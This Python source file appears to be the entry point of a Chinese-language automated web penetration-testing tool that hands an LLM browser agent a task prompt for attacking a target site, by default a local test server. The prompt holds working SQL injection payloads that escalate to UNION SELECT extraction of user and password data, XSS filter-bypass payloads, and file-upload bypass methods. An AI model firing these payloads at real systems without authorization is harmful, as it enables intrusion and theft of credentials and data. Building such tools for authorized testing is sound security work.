import asyncio
import os
import sys
import argparse
import json
import requests
import socket
import time
from requests.exceptions import RequestException, Timeout, ConnectionError
from dotenv import load_dotenv
import traceback

# 添加OpenAI客户端库
try:
    from openai import OpenAI
    OPENAI_CLIENT_AVAILABLE = True
except ImportError:
    OPENAI_CLIENT_AVAILABLE = False
    print("[警告] 未安装OpenAI客户端库，将使用requests库作为备选。建议安装openai库: pip install openai")

from browser_use import Agent
from modules.site_analyzer import SiteAnalyzer
from modules.test_config import TestConfig
from modules.siliconflow_checker import SiliconFlowChecker, test_siliconflow_api
from modules.llm_interface import LLMInterface
from cli_interface import DeePulse

# 加载环境变量
load_dotenv()

# 配置SiliconFlow API
SILICONFLOW_API_KEY = os.getenv('SILICONFLOW_API_KEY', 'YOUR_API_KEY')
SILICONFLOW_API_URL = os.getenv('SILICONFLOW_API_URL', 'https://api.siliconflow.cn/v1')
# 设置默认的SiliconFlow模型
SILICONFLOW_MODEL = 'Pro/deepseek-ai/DeepSeek-V3'  # 强制默认为Pro/DeepSeek-V3
SILICONFLOW_BACKUP_MODEL = 'deepseek-ai/DeepSeek-V2.5'
# 设置合理的超时时间
SILICONFLOW_TIMEOUT = int(os.getenv('SILICONFLOW_TIMEOUT', '60'))

# 检查轨迹流动API密钥是否有效
def check_siliconflow_api(timeout=30):
    """检查SiliconFlow API连接状态并测试模型可用性"""
    
    global SILICONFLOW_MODEL
    
    print("=" * 60)
    print("开始检查SiliconFlow API连接...")
    
    # 创建一个检查器实例
    checker = SiliconFlowChecker(api_key=SILICONFLOW_API_KEY, base_url=SILICONFLOW_API_URL)
    # 设置合理的超时
    checker.timeout = timeout
    
    # 首先检查指定的模型
    print(f"测试指定的模型: {SILICONFLOW_MODEL}")
    primary_success, primary_result = checker.test_model_connection(SILICONFLOW_MODEL)
    
    if primary_success:
        print(f"\n✓ 指定模型 {SILICONFLOW_MODEL} 连接成功!")
        timeout = checker.get_model_specific_timeout(SILICONFLOW_MODEL)
        print(f"建议超时设置: {timeout}秒")
        return True
    
    # 如果指定模型失败，测试备选模型
    print(f"\n指定模型连接失败，测试备选模型: {SILICONFLOW_BACKUP_MODEL}")
    backup_success, backup_result = checker.test_model_connection(SILICONFLOW_BACKUP_MODEL)
    
    if backup_success:
        print(f"\n✓ 备选模型 {SILICONFLOW_BACKUP_MODEL} 连接成功!")
        print(f"将使用备选模型进行测试")
        # 更新全局模型变量为备选模型
        SILICONFLOW_MODEL = SILICONFLOW_BACKUP_MODEL
        timeout = checker.get_model_specific_timeout(SILICONFLOW_MODEL)
        print(f"建议超时设置: {timeout}秒")
        return True
    
    # 如果都失败，尝试找到任何可用的模型
    print("\n指定模型和备选模型均连接失败，尝试测试所有可用模型...")
    results = checker.test_all_recommended_models()
    
    best_model = checker.get_best_available_model()
    if best_model:
        print(f"\n✓ 找到可用模型: {best_model}")
        # 更新全局模型变量
        SILICONFLOW_MODEL = best_model
        timeout = checker.get_model_specific_timeout(best_model)
        print(f"建议超时设置: {timeout}秒")
        return True
    
    print("\n[错误] 所有模型测试均失败，无法连接到SiliconFlow API")
    print("请检查您的网络连接和API密钥")
    return False

def create_task_from_config(config):
    """根据配置创建测试任务"""
    
    # 生成通用的Web安全测试任务
    task = f"""
1. 进行Web安全测试，连接到以下网站:
   {config.target_url}
2. 这是一个Web应用程序，需要进行安全漏洞测试
"""
    
    # 添加认证信息（如果提供）
    if config.auth_config:
        task += f"""
3. 使用以下凭据登录:
   - 用户名: {config.auth_config.get('username', '')}
   - 密码: {config.auth_config.get('password', '')}
"""
    
    # 添加测试类型说明
    task += """
4. 需要测试的漏洞类型:
"""
    
    # 根据配置的测试类型添加具体说明
    if not config.test_types or "sql_injection" in config.test_types:
        task += """   - SQL注入：识别输入点，尝试注入SQL代码查询数据库信息
"""
    
    if not config.test_types or "xss" in config.test_types:
        task += """   - 跨站脚本(XSS)：尝试在表单和URL参数中注入JavaScript代码
"""
        
    if not config.test_types or "csrf" in config.test_types:
        task += """   - 跨站请求伪造(CSRF)：分析表单提交是否包含防伪令牌
"""
        
    if not config.test_types or "file_upload" in config.test_types:
        task += """   - 文件上传漏洞：寻找文件上传功能并测试其安全控制
"""
    
    if not config.test_types or "command_injection" in config.test_types:
        task += """   - 命令注入：识别可能执行系统命令的输入点并尝试注入
"""
    
    # 添加一般性指导
    task += """
5. 所有分析和说明必须使用中文

注意：你需要自主分析每个步骤的结果，并决定下一步操作。不要机械地执行命令，而是根据每个步骤的实际结果来调整你的策略。

安全测试方法论：
1. 信息收集阶段
   - 分析网站结构，发现可能的攻击面
   - 识别表单、输入字段和API端点
   - 确定网站使用的技术栈
   - 查找可能存在的信息泄露

2. 漏洞扫描阶段
   - 对所有输入点进行基本测试
   - 尝试提交不同类型的特殊字符和负载
   - 观察网站响应确定漏洞可能性
   - 保存页面状态以便后续分析

3. 漏洞利用阶段
   - 针对发现的漏洞点进行深入测试
   - 尝试提取数据或执行操作以验证漏洞
   - 记录成功的利用方法和路径
   - 避免对目标系统造成实际损害

4. 安全错误处理策略（非常重要）：
   - 当遇到错误时，立即使用BACK命令返回到上一个稳定页面
   - 在稳定页面重新开始，尝试不同的注入语法
   - 避免在错误页面上继续测试，这可能导致更多错误
"""

    # 添加SQL注入测试指南（如果包含）
    if not config.test_types or "sql_injection" in config.test_types:
        task += """
SQL注入测试方法论（重要！）：
   A. 验证注入点存在性：
      - 测试普通输入：TYPE input 1
      - 测试条件语句1：TYPE input 1' and '1'='1
      - 测试条件语句2：TYPE input 1' and '1'='2
      - 比较结果差异（若条件1有数据而条件2无数据，确认存在注入点）
      
   B. SQL语法变体尝试：
      - MySQL注释变体：使用#代替-- （如：1' ORDER BY 1#）
      - 闭合方式变体：尝试1"，1)，1'))等不同闭合方式
      - 遇到语法错误时，先尝试最简单的查询验证注入点
      
   C. 确定查询结构：
      - 从ORDER BY 1开始递增，直到出错确定列数
      - 示例：1' ORDER BY 1#，1' ORDER BY 2#等
      - 若ORDER BY 2出错，说明只有1列
   
   D. 确定回显位置：
      - 使用UNION SELECT语句测试哪些位置可以回显数据
      - 示例1：1' UNION SELECT 1,2#  (适用于2列)
      - 示例2：1' UNION SELECT 1,2,3# (适用于3列)
      - 观察页面上显示的数字位置确定可回显的列

   E. 提取数据库信息：
      - 获取数据库版本：1' UNION SELECT 1,@@version#
      - 获取数据库名称：1' UNION SELECT 1,database()#
      - 获取表名：1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1#
      - 获取列名：1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1#
      - 提取用户数据：1' UNION SELECT user,password FROM users#
"""

    # 添加XSS测试指南（如果包含）
    if not config.test_types or "xss" in config.test_types:
        task += """
XSS跨站脚本测试方法论：
   A. 验证注入点：
      - 测试普通文本输入
      - 测试简单HTML如<b>粗体文本</b>
      - 测试基本脚本如<script>alert('XSS')</script>
   
   B. 绕过过滤尝试：
      - 使用不同大小写：<sCRipt>alert('XSS')</SCripT>
      - 使用HTML编码：&lt;script&gt;alert('XSS')&lt;/script&gt;
      - 使用事件处理：<img src=x onerror="alert('XSS')">
      - 使用JavaScript伪协议：<a href="javascript:alert('XSS')">点击我</a>
   
   C. 验证漏洞存在：
      - 检查输入是否被直接反射到页面上
      - 检查是否成功执行JavaScript代码
      - 检查是否能够窃取cookie或执行其他操作
"""

    # 添加文件上传测试指南（如果包含）
    if not config.test_types or "file_upload" in config.test_types:
        task += """
文件上传漏洞测试方法论：
   A. 识别上传功能：
      - 寻找文件上传表单和按钮
      - 确定允许的文件类型
      - 测试上传正常文件作为基准
   
   B. 尝试上传恶意文件：
      - 尝试上传不同扩展名的脚本文件（.php, .jsp, .asp等）
      - 尝试修改Content-Type绕过检查
      - 尝试使用双扩展名（file.php.jpg）
      - 尝试使用大小写混合（file.pHp）
   
   C. 验证漏洞：
      - 确定上传的文件位置
      - 尝试访问上传的文件
      - 检查是否能够执行上传的代码
"""

    # 添加通用命令说明
    task += """
可用命令参考：
- GOTO [url] - 导航到指定URL
- CLICK [selector] - 点击元素
- TYPE [selector] [text] - 在元素中输入文本
- WAIT [ms] - 等待指定毫秒
- SCREENSHOT - 截取页面截图
- THINK [analysis] - 分析当前情况（这是记录你思考过程的命令）
- BACK - 返回上一页（重要！在遇到错误时使用）
- REFRESH - 刷新页面
- ENTER - 按下回车键
- SCROLLDOWN [pixels] - 向下滚动指定像素
- SCROLLUP [pixels] - 向上滚动指定像素

安全测试的关键原则：
1. 始终记录并分析每一步的结果
2. 遇到错误时立即返回稳定页面
3. 错误也是信息，帮助确定正确的注入方法
4. 复杂测试前先确认基本注入是否成功
5. 尝试不同的注入语法和闭合方式
"""
    
    return task

async def run_automated_test(config=None, user_prompt_enabled=False, user_prompt_frequency=3):
    """
    运行自动化测试
    
    Args:
        config: 测试配置对象
        user_prompt_enabled: 是否启用用户自定义提示词功能
        user_prompt_frequency: 用户提示词输入频率（迭代次数）
    """
    
    # 如果没有提供配置，创建默认配置
    if config is None:
        config = TestConfig()
        # 设置默认目标为测试站点
        config.target_url = "http://localhost:3000/"
        config.test_types = ["sql_injection", "xss"]
    
    # 首先检查轨迹流动API
    if not check_siliconflow_api():
        print("由于无法连接到SiliconFlow API，测试将中止。")
        print("\n请检查您的API密钥和网络连接，确保可以访问SiliconFlow API。")
        sys.exit(1)
    
    # 确认模型
    print(f"将使用模型: {SILICONFLOW_MODEL}")
    
    # 添加使用AI判断页面状态的说明
    print("-" * 50)
    print("页面状态检测机制：")
    print("1. 系统会使用AI模型判断页面状态是否正常")
    print("2. 遇到明确的SQL错误、HTTP错误等会被识别为异常状态")
    print("3. 仅当AI判断为异常状态时，才会触发自动恢复机制")
    print("4. 如果AI无法确定，将使用传统的规则判断")
    print("-" * 50)
    
    # 是否启用用户自定义提示词输入
    if user_prompt_enabled:
        print("-" * 50)
        print("用户自定义提示词功能：")
        print(f"1. 系统将每 {user_prompt_frequency} 轮迭代询问一次用户输入")
        print("2. 您可以输入自定义提示词来指导AI的行为")
        print("3. 直接按回车可跳过当前提示词输入")
        print("-" * 50)
    
    # 创建任务
    task = create_task_from_config(config)
    
    # 创建一个SiteAnalyzer实例（将在第二阶段完全实现）
    site_analyzer = SiteAnalyzer()
    
    # 创建LLM接口实例
    llm_interface = LLMInterface(
        api_key=SILICONFLOW_API_KEY,
        base_url=SILICONFLOW_API_URL,
        model=SILICONFLOW_MODEL,
        backup_model=SILICONFLOW_BACKUP_MODEL,
        timeout=SILICONFLOW_TIMEOUT
    )
    
    # 创建一个Agent实例，直接传入API密钥和LLM接口
    agent = Agent(
        task=task,
        api_key=SILICONFLOW_API_KEY,
        model=SILICONFLOW_MODEL,
        use_vision=False,  # 禁用视觉能力，因为当前模型不支持图像输入
        debug=True,       # 启用调试模式以查看更多信息
        auto_run=False,   # 禁用自动运行预设命令，改为让AI决策
        auto_recovery=True, # 启用自动恢复功能
        error_recovery_level=2, # 设置错误级别2（中等错误）及以上触发自动恢复
        site_analyzer=site_analyzer,  # 传入站点分析器
        user_prompt_enabled=user_prompt_enabled,  # 启用用户自定义提示词功能
        user_prompt_frequency=user_prompt_frequency  # 设置用户提示词输入频率
    )
    
    # 运行Agent
    await agent.run()

def parse_args():
    """解析命令行参数"""
    # 获取当前设置的模型
    current_model = os.getenv('SILICONFLOW_MODEL', 'Pro/deepseek-ai/DeepSeek-V3')
    
    parser = argparse.ArgumentParser(description='通用Web站点渗透测试工具')
    
    # 添加一个新的交互模式选项，用于启动CLI界面
    parser.add_argument('--cli', help='启动交互式命令行界面', action='store_true')
    
    parser.add_argument('-u', '--url', help='目标URL', default='http://localhost:3000/')
    parser.add_argument('-t', '--tests', help='要执行的测试类型，用逗号分隔 (sql,xss,csrf,file_upload,command_injection,all)', default='all')
    parser.add_argument('-d', '--depth', help='爬取深度', type=int, default=2)
    parser.add_argument('-c', '--config', help='配置文件路径')
    parser.add_argument('-a', '--auth', help='认证信息，格式为 username:password')
    parser.add_argument('--timeout', help='测试超时时间(秒)', type=int, default=SILICONFLOW_TIMEOUT)
    parser.add_argument('--interactive', help='使用交互模式配置测试', action='store_true')
    parser.add_argument('--model', help=f'指定使用的模型（默认: {current_model}）', default=current_model)
    parser.add_argument('--user-prompt', help='启用用户自定义提示词功能', action='store_true')
    parser.add_argument('--prompt-frequency', help='用户提示词输入频率（迭代次数）', type=int, default=3)
    
    return parser.parse_args()

def launch_cli_interface():
    """启动CLI界面"""
    cli = DeePulse()
    cli.run()

if __name__ == '__main__':
    try:
        # 解析命令行参数
        args = parse_args()
        
        # 如果指定了--cli参数或没有提供任何参数，启动CLI界面
        if args.cli or len(sys.argv) == 1:
            launch_cli_interface()
        else:
            # 如果指定了模型，更新全局模型变量
            if args.model:
                SILICONFLOW_MODEL = args.model
                # 同时更新环境变量
                os.environ['SILICONFLOW_MODEL'] = args.model
                
            # 如果指定了超时，更新全局超时变量
            if args.timeout:
                SILICONFLOW_TIMEOUT = args.timeout
                os.environ['SILICONFLOW_TIMEOUT'] = str(args.timeout)
            
            # 创建配置
            if args.interactive:
                # 交互式配置（将在后续实现）
                config = TestConfig.from_interactive()
            elif args.config:
                # 从配置文件加载
                config = TestConfig.from_file(args.config)
            else:
                # 从命令行参数创建
                config = TestConfig.from_args(args)
                
            # 运行测试，传入用户自定义提示词相关参数
            asyncio.run(run_automated_test(
                config, 
                user_prompt_enabled=args.user_prompt, 
                user_prompt_frequency=args.prompt_frequency
            ))
        
    except KeyboardInterrupt:
        print("\n测试被用户中断")
    except Exception as e:
        print(f"执行过程中发生错误: {str(e)}")
        import traceback
        traceback.print_exc() 